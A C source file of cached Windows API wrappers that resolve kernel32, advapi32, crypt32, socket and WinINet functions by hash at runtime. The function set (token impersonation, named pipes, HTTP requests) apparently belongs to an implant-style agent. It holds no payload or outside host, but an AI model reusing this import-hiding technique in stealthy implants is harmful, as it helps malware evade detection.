DEFINE_CACHED_WINAPI_WRAPPER(HGLOBAL, winapi_kernel32_GlobalFree, WINAPI, KERNEL32_DLL, H_GlobalFree,
    (HGLOBAL hMem), (hMem), hMem)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_CreateNamedPipeA, WINAPI, KERNEL32_DLL, H_CreateNamedPipeA,
    (LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes),
    (lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize, nInBufferSize, nDefaultTimeOut, lpSecurityAttributes), INVALID_HANDLE_VALUE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_ConnectNamedPipe, WINAPI, KERNEL32_DLL, H_ConnectNamedPipe,
    (HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped), (hNamedPipe, lpOverlapped), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_GetOverlappedResult, WINAPI, KERNEL32_DLL, H_GetOverlappedResult,
    (HANDLE hFile, LPOVERLAPPED lpOverlapped, LPDWORD lpNumberOfBytesTransferred, BOOL bWait),
    (hFile, lpOverlapped, lpNumberOfBytesTransferred, bWait), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_ReadFile, WINAPI, KERNEL32_DLL, H_ReadFile,
    (HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped),
    (hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_CreateThread, WINAPI, KERNEL32_DLL, H_CreateThread,
    (LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId),
    (lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_ResetEvent, WINAPI, KERNEL32_DLL, H_ResetEvent,
    (HANDLE hEvent), (hEvent), FALSE)

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_SetThreadErrorMode, WINAPI, KERNEL32_DLL, H_SetThreadErrorMode,
    (DWORD dwNewMode, LPDWORD lpOldMode), (dwNewMode, lpOldMode), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HMODULE, winapi_kernel32_GetModuleHandleA, WINAPI, KERNEL32_DLL, H_GetModuleHandleA,
    (LPCSTR lpModuleName), (lpModuleName), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_CreateFileW, WINAPI, KERNEL32_DLL, H_CreateFileW,
    (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile),
    (lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile), INVALID_HANDLE_VALUE)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_CreateNamedPipeW, WINAPI, KERNEL32_DLL, H_CreateNamedPipeW,
    (LPCWSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes),
    (lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize, nInBufferSize, nDefaultTimeOut, lpSecurityAttributes), INVALID_HANDLE_VALUE)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_CreateEventA, WINAPI, KERNEL32_DLL, H_CreateEventA,
    (LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName),
    (lpEventAttributes, bManualReset, bInitialState, lpName), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_CreateEventW, WINAPI, KERNEL32_DLL, H_CreateEventW,
    (LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName),
    (lpEventAttributes, bManualReset, bInitialState, lpName), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_SetEvent, WINAPI, KERNEL32_DLL, H_SetEvent,
    (HANDLE hEvent), (hEvent), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_WaitForSingleObject, WINAPI, KERNEL32_DLL, H_WaitForSingleObject,
    (HANDLE hHandle, DWORD dwMilliseconds), (hHandle, dwMilliseconds), WAIT_FAILED)
DEFINE_CACHED_WINAPI_VOID_WRAPPER(winapi_kernel32_Sleep, WINAPI, KERNEL32_DLL, H_Sleep,
    (DWORD dwMilliseconds), (dwMilliseconds))
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_GetProcessHeap, WINAPI, KERNEL32_DLL, H_GetProcessHeap,
    (VOID), (), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(LPVOID, winapi_kernel32_HeapAlloc, WINAPI, KERNEL32_DLL, H_HeapAlloc,
    (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes), (hHeap, dwFlags, dwBytes), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_HeapFree, WINAPI, KERNEL32_DLL, H_HeapFree,
    (HANDLE hHeap, DWORD dwFlags, LPVOID lpMem), (hHeap, dwFlags, lpMem), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_IsWow64Process, WINAPI, KERNEL32_DLL, H_IsWow64Process,
    (HANDLE hProcess, PBOOL Wow64Process), (hProcess, Wow64Process), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_ProcessIdToSessionId, WINAPI, KERNEL32_DLL, H_ProcessIdToSessionId,
    (DWORD dwProcessId, DWORD* pSessionId), (dwProcessId, pSessionId), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_GetCurrentThreadId, WINAPI, KERNEL32_DLL, H_GetCurrentThreadId,
    (VOID), (), 0)

// END: kernel32.dll
// START: kernel32 extensions.dll

DEFINE_CACHED_WINAPI_WRAPPER(LPVOID, winapi_kernel32_HeapReAlloc, WINAPI, KERNEL32_DLL, H_HeapReAlloc,
    (HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes), (hHeap, dwFlags, lpMem, dwBytes), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(HLOCAL, winapi_kernel32_LocalAlloc, WINAPI, KERNEL32_DLL, H_LocalAlloc,
    (UINT uFlags, SIZE_T uBytes), (uFlags, uBytes), NULL)
DEFINE_CACHED_WINAPI_VOID_WRAPPER(winapi_kernel32_GetSystemTime, WINAPI, KERNEL32_DLL, H_GetSystemTime,
    (LPSYSTEMTIME lpSystemTime), (lpSystemTime))
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_SystemTimeToFileTime, WINAPI, KERNEL32_DLL, H_SystemTimeToFileTime,
    (const SYSTEMTIME* lpSystemTime, LPFILETIME lpFileTime), (lpSystemTime, lpFileTime), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_kernel32_MultiByteToWideChar, WINAPI, KERNEL32_DLL, H_MultiByteToWideChar,
    (UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar),
    (CodePage, dwFlags, lpMultiByteStr, cbMultiByte, lpWideCharStr, cchWideChar), 0)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_kernel32_WideCharToMultiByte, WINAPI, KERNEL32_DLL, H_WideCharToMultiByte,
    (UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar),
    (CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar), 0)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_PeekNamedPipe, WINAPI, KERNEL32_DLL, H_PeekNamedPipe,
    (HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage),
    (hNamedPipe, lpBuffer, nBufferSize, lpBytesRead, lpTotalBytesAvail, lpBytesLeftThisMessage), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_SetNamedPipeHandleState, WINAPI, KERNEL32_DLL, H_SetNamedPipeHandleState,
    (HANDLE hNamedPipe, LPDWORD lpMode, LPDWORD lpMaxCollectionCount, LPDWORD lpCollectDataTimeout),
    (hNamedPipe, lpMode, lpMaxCollectionCount, lpCollectDataTimeout), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_ReleaseMutex, WINAPI, KERNEL32_DLL, H_ReleaseMutex,
    (HANDLE hMutex), (hMutex), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_CreateMutexA, WINAPI, KERNEL32_DLL, H_CreateMutexA,
    (LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName),
    (lpMutexAttributes, bInitialOwner, lpName), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_CreateMutexW, WINAPI, KERNEL32_DLL, H_CreateMutexW,
    (LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName),
    (lpMutexAttributes, bInitialOwner, lpName), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_TerminateThread, WINAPI, KERNEL32_DLL, H_TerminateThread,
    (HANDLE hThread, DWORD dwExitCode), (hThread, dwExitCode), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_kernel32_lstrcmpW, WINAPI, KERNEL32_DLL, H_lstrcmpW,
    (LPCWSTR lpString1, LPCWSTR lpString2), (lpString1, lpString2), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_GetLastError, WINAPI, KERNEL32_DLL, H_GetLastError,
    (VOID), (), ERROR_PROC_NOT_FOUND)

// END: kernel32 extensions.dll
// START: advapi32.dll

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_OpenProcessToken, WINAPI, ADVAPI32_DLL, H_OpenProcessToken,
    (HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle), (ProcessHandle, DesiredAccess, TokenHandle), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_AdjustTokenPrivileges, WINAPI, ADVAPI32_DLL, H_AdjustTokenPrivileges,
    (HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength),
    (TokenHandle, DisableAllPrivileges, NewState, BufferLength, PreviousState, ReturnLength), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_ImpersonateLoggedOnUser, WINAPI, ADVAPI32_DLL, H_ImpersonateLoggedOnUser,
    (HANDLE hToken), (hToken), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptDuplicateKey, WINAPI, ADVAPI32_DLL, H_CryptDuplicateKey,
    (HCRYPTKEY hKey, DWORD* pdwReserved, DWORD dwFlags, HCRYPTKEY* phKey), (hKey, pdwReserved, dwFlags, phKey), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptSetKeyParam, WINAPI, ADVAPI32_DLL, H_CryptSetKeyParam,
    (HCRYPTKEY hKey, DWORD dwParam, const BYTE* pbData, DWORD dwFlags), (hKey, dwParam, pbData, dwFlags), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptDecrypt, WINAPI, ADVAPI32_DLL, H_CryptDecrypt,
    (HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen),
    (hKey, hHash, Final, dwFlags, pbData, pdwDataLen), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptGenRandom, WINAPI, ADVAPI32_DLL, H_CryptGenRandom,
    (HCRYPTPROV hProv, DWORD dwLen, BYTE* pbBuffer), (hProv, dwLen, pbBuffer), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptEncrypt, WINAPI, ADVAPI32_DLL, H_CryptEncrypt,
    (HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen, DWORD dwBufLen),
    (hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptDestroyKey, WINAPI, ADVAPI32_DLL, H_CryptDestroyKey,
    (HCRYPTKEY hKey), (hKey), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptReleaseContext, WINAPI, ADVAPI32_DLL, H_CryptReleaseContext,
    (HCRYPTPROV hProv, DWORD dwFlags), (hProv, dwFlags), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptImportKey, WINAPI, ADVAPI32_DLL, H_CryptImportKey,
    (HCRYPTPROV hProv, const BYTE* pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY* phKey),
    (hProv, pbData, dwDataLen, hPubKey, dwFlags, phKey), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_OpenThreadToken, WINAPI, ADVAPI32_DLL, H_OpenThreadToken,
    (HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle), (ThreadHandle, DesiredAccess, OpenAsSelf, TokenHandle), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_AllocateAndInitializeSid, WINAPI, ADVAPI32_DLL, H_AllocateAndInitializeSid,
    (PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD dwSubAuthority0, DWORD dwSubAuthority1,
        DWORD dwSubAuthority2, DWORD dwSubAuthority3, DWORD dwSubAuthority4, DWORD dwSubAuthority5, DWORD dwSubAuthority6,
        DWORD dwSubAuthority7, PSID* pSid),
    (pIdentifierAuthority, nSubAuthorityCount, dwSubAuthority0, dwSubAuthority1, dwSubAuthority2, dwSubAuthority3,
        dwSubAuthority4, dwSubAuthority5, dwSubAuthority6, dwSubAuthority7, pSid), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_advapi32_SetEntriesInAclW, WINAPI, ADVAPI32_DLL, H_SetEntriesInAclW,
    (ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_W pListOfExplicitEntries, PACL OldAcl, PACL* NewAcl),
    (cCountOfExplicitEntries, pListOfExplicitEntries, OldAcl, NewAcl), ERROR_INVALID_FUNCTION)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_InitializeAcl, WINAPI, ADVAPI32_DLL, H_InitializeAcl,
    (PACL pAcl, DWORD nAclLength, DWORD dwAclRevision), (pAcl, nAclLength, dwAclRevision), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_InitializeSecurityDescriptor, WINAPI, ADVAPI32_DLL, H_InitializeSecurityDescriptor,
    (PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision), (pSecurityDescriptor, dwRevision), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_SetSecurityDescriptorDacl, WINAPI, ADVAPI32_DLL, H_SetSecurityDescriptorDacl,
    (PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted),
    (pSecurityDescriptor, bDaclPresent, pDacl, bDaclDefaulted), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_SetSecurityDescriptorSacl, WINAPI, ADVAPI32_DLL, H_SetSecurityDescriptorSacl,
    (PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bSaclPresent, PACL pSacl, BOOL bSaclDefaulted),
    (pSecurityDescriptor, bSaclPresent, pSacl, bSaclDefaulted), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_LookupPrivilegeValueW, WINAPI, ADVAPI32_DLL, H_LookupPrivilegeValueW,
    (LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid), (lpSystemName, lpName, lpLuid), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptAcquireContextA, WINAPI, ADVAPI32_DLL, H_CryptAcquireContextA,
    (HCRYPTPROV* phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags),
    (phProv, szContainer, szProvider, dwProvType, dwFlags), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptAcquireContextW, WINAPI, ADVAPI32_DLL, H_CryptAcquireContextW,
    (HCRYPTPROV* phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags),
    (phProv, szContainer, szProvider, dwProvType, dwFlags), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_AddMandatoryAce, WINAPI, ADVAPI32_DLL, H_AddMandatoryAce,
    (PACL pAcl, DWORD dwAceRevision, DWORD AceFlags, DWORD MandatoryPolicy, PSID pLabelSid),
    (pAcl, dwAceRevision, AceFlags, MandatoryPolicy, pLabelSid), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptCreateHash, WINAPI, ADVAPI32_DLL, H_CryptCreateHash,
    (HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH* phHash),
    (hProv, Algid, hKey, dwFlags, phHash), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptDestroyHash, WINAPI, ADVAPI32_DLL, H_CryptDestroyHash,
    (HCRYPTHASH hHash), (hHash), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptGetHashParam, WINAPI, ADVAPI32_DLL, H_CryptGetHashParam,
    (HCRYPTHASH hHash, DWORD dwParam, BYTE* pbData, DWORD* pdwDataLen, DWORD dwFlags),
    (hHash, dwParam, pbData, pdwDataLen, dwFlags), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CryptHashData, WINAPI, ADVAPI32_DLL, H_CryptHashData,
    (HCRYPTHASH hHash, const BYTE* pbData, DWORD dwDataLen, DWORD dwFlags), (hHash, pbData, dwDataLen, dwFlags), FALSE)

// END: advapi32.dll
// START: crypt32.dll

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_crypt32_CryptDecodeObjectEx, WINAPI, CRYPT32_DLL, H_CryptDecodeObjectEx,
    (DWORD dwCertEncodingType, LPCSTR lpszStructType, const BYTE* pbEncoded, DWORD cbEncoded, DWORD dwFlags,
        PCRYPT_DECODE_PARA pDecodePara, void* pvStructInfo, DWORD* pcbStructInfo),
    (dwCertEncodingType, lpszStructType, pbEncoded, cbEncoded, dwFlags, pDecodePara, pvStructInfo, pcbStructInfo), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_crypt32_CryptImportPublicKeyInfo, WINAPI, CRYPT32_DLL, H_CryptImportPublicKeyInfo,
    (HCRYPTPROV hCryptProv, DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, HCRYPTKEY* phKey),
    (hCryptProv, dwCertEncodingType, pInfo, phKey), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_crypt32_CertGetCertificateContextProperty, WINAPI, CRYPT32_DLL, H_CertGetCertificateContextProperty,
    (PCCERT_CONTEXT pCertContext, DWORD dwPropId, void* pvData, DWORD* pcbData),
    (pCertContext, dwPropId, pvData, pcbData), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_crypt32_CryptBinaryToStringA, WINAPI, CRYPT32_DLL, H_CryptBinaryToStringA,
    (const BYTE* pbBinary, DWORD cbBinary, DWORD dwFlags, LPSTR pszString, DWORD* pcchString),
    (pbBinary, cbBinary, dwFlags, pszString, pcchString), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_crypt32_CryptStringToBinaryA, WINAPI, CRYPT32_DLL, H_CryptStringToBinaryA,
    (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE* pbBinary, DWORD* pcbBinary, DWORD* pdwSkip, DWORD* pdwFlags),
    (pszString, cchString, dwFlags, pbBinary, pcbBinary, pdwSkip, pdwFlags), FALSE)

// END: crypt32.dll
// START: user32.dll

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_GetUserObjectInformationA, WINAPI, USER32_DLL, H_GetUserObjectInformationA,
    (HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded),
    (hObj, nIndex, pvInfo, nLength, lpnLengthNeeded), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HDESK, winapi_user32_GetThreadDesktop, WINAPI, USER32_DLL, H_GetThreadDesktop,
    (DWORD dwThreadId), (dwThreadId), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(HWINSTA, winapi_user32_GetProcessWindowStation, WINAPI, USER32_DLL, H_GetProcessWindowStation,
    (VOID), (), NULL)

// END: user32.dll
// START: ws2_32.dll
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_WSAStartup, WSAAPI, WS2_32_DLL, H_WSAStartup,
    (WORD wVersionRequired, LPWSADATA lpWSAData), (wVersionRequired, lpWSAData), WSASYSNOTREADY)
DEFINE_CACHED_WINAPI_WRAPPER(SOCKET, winapi_ws2_32_socket, WSAAPI, WS2_32_DLL, H_socket,
    (int af, int type, int protocol), (af, type, protocol), INVALID_SOCKET)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_connect, WSAAPI, WS2_32_DLL, H_connect,
    (SOCKET s, const struct sockaddr* name, int namelen), (s, name, namelen), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(SOCKET, winapi_ws2_32_accept, WSAAPI, WS2_32_DLL, H_accept,
    (SOCKET s, struct sockaddr* addr, int* addrlen), (s, addr, addrlen), INVALID_SOCKET)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_setsockopt, WSAAPI, WS2_32_DLL, H_setsockopt,
    (SOCKET s, int level, int optname, const char* optval, int optlen), (s, level, optname, optval, optlen), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_recv, WSAAPI, WS2_32_DLL, H_recv,
    (SOCKET s, char* buf, int len, int flags), (s, buf, len, flags), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_WSADuplicateSocketA, WSAAPI, WS2_32_DLL, H_WSADuplicateSocketA,
    (SOCKET s, DWORD dwProcessId, LPWSAPROTOCOL_INFOA lpProtocolInfo), (s, dwProcessId, lpProtocolInfo), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_send, WSAAPI, WS2_32_DLL, H_send,
    (SOCKET s, const char* buf, int len, int flags), (s, buf, len, flags), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_bind, WSAAPI, WS2_32_DLL, H_bind,
    (SOCKET s, const struct sockaddr* name, int namelen), (s, name, namelen), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_listen, WSAAPI, WS2_32_DLL, H_listen,
    (SOCKET s, int backlog), (s, backlog), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_closesocket, WSAAPI, WS2_32_DLL, H_closesocket,
    (SOCKET s), (s), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_select, WSAAPI, WS2_32_DLL, H_select,
    (int nfds, fd_set* readfds, fd_set* writefds, fd_set* exceptfds, const struct timeval* timeout),
    (nfds, readfds, writefds, exceptfds, timeout), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(struct hostent*, winapi_ws2_32_gethostbyname, WSAAPI, WS2_32_DLL, H_gethostbyname,
    (const char* name), (name), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_getaddrinfo, WSAAPI, WS2_32_DLL, H_getaddrinfo,
    (PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA* pHints, PADDRINFOA* ppResult),
    (pNodeName, pServiceName, pHints, ppResult), WSAEINVAL)
DEFINE_CACHED_WINAPI_VOID_WRAPPER(winapi_ws2_32_freeaddrinfo, WSAAPI, WS2_32_DLL, H_freeaddrinfo,
    (PADDRINFOA pAddrInfo), (pAddrInfo))
DEFINE_CACHED_WINAPI_WRAPPER(u_short, winapi_ws2_32_htons, WSAAPI, WS2_32_DLL, H_htons,
    (u_short hostshort), (hostshort), 0)
DEFINE_CACHED_WINAPI_WRAPPER(u_long, winapi_ws2_32_htonl, WSAAPI, WS2_32_DLL, H_htonl,
    (u_long hostlong), (hostlong), 0)
DEFINE_CACHED_WINAPI_WRAPPER(u_long, winapi_ws2_32_ntohl, WSAAPI, WS2_32_DLL, H_ntohl,
    (u_long netlong), (netlong), 0)
DEFINE_CACHED_WINAPI_WRAPPER(unsigned long, winapi_ws2_32_inet_addr, WSAAPI, WS2_32_DLL, H_inet_addr,
    (const char* cp), (cp), INADDR_NONE)

// END: ws2_32.dll
// START: ws2_32 extensions.dll

int winapi_ws2_32_WSAGetLastError(VOID) {
    static WinApiFunctionCache cache = WINAPI_FUNCTION_CACHE_INIT;
    int (WSAAPI *pWSAGetLastError)(VOID) = (int (WSAAPI *)(VOID))GetFunctionHCached(&cache, WS2_32_DLL, H_WSAGetLastError);
    // Do not log before reading the Winsock error: debug output can perform
    // socket operations and overwrite the value this accessor must return.
    if (pWSAGetLastError) {
        return pWSAGetLastError();
    }
    return 0;
}

DEFINE_CACHED_WINAPI_WRAPPER(char*, winapi_ws2_32_inet_ntoa, WSAAPI, WS2_32_DLL, H_inet_ntoa,
    (struct in_addr in), (in), NULL)

// END: ws2_32 extensions.dll
// START: wininet.dll

DEFINE_CACHED_WINAPI_WRAPPER(HINTERNET, winapi_wininet_InternetOpenW, WINAPI, WININET_DLL, H_InternetOpenW,
    (LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags),
    (lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(HINTERNET, winapi_wininet_InternetConnectW, WINAPI, WININET_DLL, H_InternetConnectW,
    (HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext),
    (hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(HINTERNET, winapi_wininet_HttpOpenRequestW, WINAPI, WININET_DLL, H_HttpOpenRequestW,
    (HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext),
    (hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_wininet_InternetSetOptionW, WINAPI, WININET_DLL, H_InternetSetOptionW,
    (HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength),
    (hInternet, dwOption, lpBuffer, dwBufferLength), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_wininet_HttpSendRequestW, WINAPI, WININET_DLL, H_HttpSendRequestW,
    (HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength),
    (hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_wininet_HttpQueryInfoW, WINAPI, WININET_DLL, H_HttpQueryInfoW,
    (HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex),
    (hRequest, dwInfoLevel, lpBuffer, lpdwBufferLength, lpdwIndex), FALSE)
